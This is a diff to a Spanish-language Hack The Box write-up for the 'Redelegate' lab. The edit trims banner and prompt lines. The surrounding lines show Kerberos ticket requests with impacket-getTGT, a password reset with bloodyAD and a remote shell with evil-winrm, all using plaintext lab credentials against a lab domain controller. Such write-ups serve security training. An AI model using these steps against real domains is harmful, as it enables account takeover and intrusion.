@@ -438,10 +438,6 @@ impacket-getTGT redelegate.vl/Marie.Curie:'Fall2024!' -dc-ip 10.129.234.50
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in Marie.Curie.ccache
-                                                                                                                                                                                          
-┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/redelegate]
-└─# export KRB5CCNAME=Marie.Curie.ccache
-
 ```
 
 Y ahora con `bloodyAD`, le cambiamos la pass
@@ -455,12 +451,7 @@ bloodyAD -u Marie.Curie -p 'Fall2024!' -d redelegate.vl -k --host dc.redelegate.
 evil-winrm -i redelegate.vl -u helen.frost -p 'zs1n123!$'
                                         
 Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
+
 *Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
 ```
 
